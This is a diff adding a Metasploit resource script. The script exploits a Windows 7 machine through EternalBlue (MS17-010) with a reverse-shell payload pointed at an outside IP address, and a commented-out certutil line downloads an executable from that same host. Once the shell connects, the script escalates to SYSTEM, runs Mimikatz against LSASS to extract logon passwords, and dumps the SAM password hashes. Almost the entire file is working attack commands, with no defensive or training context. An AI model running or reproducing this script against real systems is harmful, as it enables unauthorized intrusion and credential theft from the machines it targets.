@@ -1,0 +1,30 @@
+# Metasploit resource script to exploit a Windows 7 machine and extract credentials
+
+# Use exploit/multi/handler to handle the reverse shell connection
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set RHOSTS 192.168.100.123
+set LHOST 9.53.99.47
+set LPORT 12345
+exploit -j
+
+#sudo salt 'hn-wks-04' cmd.run 'certutil -urlcache -split -f "http://9.53.99.47/something_cool.exe" "C:\\Users\\Administrator\\Desktop\\something_cool.exe"'
+
+sleep 10
+
+# Interact with the first Meterpreter session and escalate privileges
+sessions -i 1 -C "getsystem"
+sleep 2
+
+# Display the current user's privileges to confirm SYSTEM access
+sessions -i 1 -C "getuid"
+sleep 2
+
+# Load Mimikatz and extract credentials from LSASS
+sessions -i 1 -C "load kiwi"
+sleep 2
+sessions -i 1 -C "kiwi_cmd \"sekurlsa::logonpasswords\""
+sleep 2
+
+# Dump password hashes from the SAM database
+sessions -i 1 -C "hashdump"
